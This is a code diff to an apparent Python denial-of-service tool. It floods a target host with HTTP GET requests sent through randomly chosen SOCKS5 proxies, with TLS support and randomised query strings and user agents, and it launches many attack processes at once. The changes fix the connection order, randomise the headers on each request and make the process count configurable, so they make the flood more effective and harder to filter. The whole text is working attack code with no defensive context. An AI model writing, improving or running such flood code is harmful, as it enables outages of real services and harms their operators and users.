@@ -97,27 +97,24 @@ def checkProxies():
     for proxy in proxies:
         f.write(proxy)
     f.close()
-    
-time.sleep(1)
-    
+
 def Flood():
     valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
     proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
-    Accept = rC(AcceptHeaders)
-    User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
-    floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
-    floodHeader = floodHeader.encode()
     while True:
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
+            s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
-            s.connect((targetHost, targetPort))
             for _ in range(100):
-                print(floodHeader)
+                Accept = rC(AcceptHeaders)
+                User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
+                floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
+                floodHeader = floodHeader.encode()
                 s.send(floodHeader)
             print("Flood sent " + proxy[0] + ":" + proxy[1])
         except socket.error:
@@ -145,7 +142,8 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for indexPicker in range(5000):
+for indexPicker in range(threadNumber):
     thread = multiprocessing.Process(target=Flood)
     thread.setDaemon = False
     thread.start()
+
